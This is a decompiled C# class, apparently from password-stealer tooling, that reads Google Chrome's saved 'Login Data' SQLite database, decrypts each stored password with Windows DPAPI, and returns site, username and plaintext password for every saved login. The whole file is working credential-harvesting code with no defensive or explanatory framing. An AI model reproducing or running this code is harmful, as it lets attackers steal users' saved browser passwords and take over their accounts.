// Decompiled with JetBrains decompiler
// Type: Decrypt.Chrome
// Assembly: Decrypt, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 2765FEAE-7833-475D-8D48-4374EDF0542D
// Assembly location: C:\Users\foxov\Desktop\build\bin\Debug\Decrypt.dll

using System;
using System.Collections.Generic;
using System.Data;
using System.Data.SQLite;
using System.IO;
using System.Text;

namespace Decrypt
{
  public class Chrome : IPasswordDecrypter
  {
    private string LoginData;

    public Chrome(string _loginData)
    {
      if (string.IsNullOrWhiteSpace(_loginData))
        throw new ArgumentNullException("_loginData");
      if (!File.Exists(_loginData))
        throw new ArgumentException(string.Format("File \"{0}\" not found", (object) _loginData));
      this.LoginData = _loginData;
    }

    public List<BrowserLog> GetPasswords()
    {
      try
      {
        List<BrowserLog> browserLogList = new List<BrowserLog>();
        string connectionString = string.Format("Data Source = {0}", (object) this.LoginData);
        string str1 = "logins";
        byte[] entropyBytes = (byte[]) null;
        DataTable dataTable = new DataTable();
        using (SQLiteConnection connection = new SQLiteConnection(connectionString))
          new SQLiteDataAdapter(new SQLiteCommand(string.Format("SELECT * FROM {0}", (object) str1), connection)).Fill(dataTable);
        for (int index = 0; index < dataTable.Rows.Count; ++index)
        {
          string str2 = dataTable.Rows[index][1].ToString();
          string str3 = dataTable.Rows[index][3].ToString();
          string description;
          string str4 = new UTF8Encoding(true).GetString(DPAPI.Decrypt((byte[]) dataTable.Rows[index][5], entropyBytes, out description));
          BrowserLog browserLog = new BrowserLog()
          {
            Host = string.IsNullOrWhiteSpace(str2) ? "UNKOWN" : str2,
            Login = string.IsNullOrWhiteSpace(str3) ? "UNKOWN" : str3,
            Password = string.IsNullOrWhiteSpace(str4) ? "UNKOWN" : str4
          };
          if (browserLog.Login != "UNKOWN" && browserLog.Password != "UNKOWN" && browserLog.Host != "UNKOWN")
            browserLogList.Add(browserLog);
        }
        return browserLogList;
      }
      catch
      {
        return new List<BrowserLog>();
      }
    }
  }
}
